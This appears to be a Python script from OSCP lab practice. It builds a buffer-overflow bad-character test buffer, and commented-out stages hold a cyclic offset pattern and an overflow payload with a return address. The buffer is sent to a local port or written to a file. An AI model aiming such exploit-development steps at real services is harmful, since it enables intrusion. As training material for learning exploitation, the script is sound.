import socket
import subprocess
from sys import stdin
from time import sleep

bad=[0,0x0a,0x0d,0xc2,0x37,0x20,0x39,0x7a]

buf = b""
for i in range(256):
    if(i not in bad):
        buf += i.to_bytes(1,'little')
buf += b"\xff"
buf += b"\n"

"""pattern_size = 4000
pattern=subprocess.run(["msf-pattern_create","-l",str(pattern_size)],capture_output=True).stdout
buf = pattern"""

"""buf = b"a"*3892
buf += b"\x2b\x86\x04\x08"
buf += b"\x0a"""
print(buf)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

file = 1
if(not file):
    s.connect(("127.0.0.1", 4444))
    s.send(buf)
    sleep(2)
    s.close()
else:
    file = open("/home/kali/OSCP_exercise/exploit.txt","wb")
    file.write(buf)
    file.close

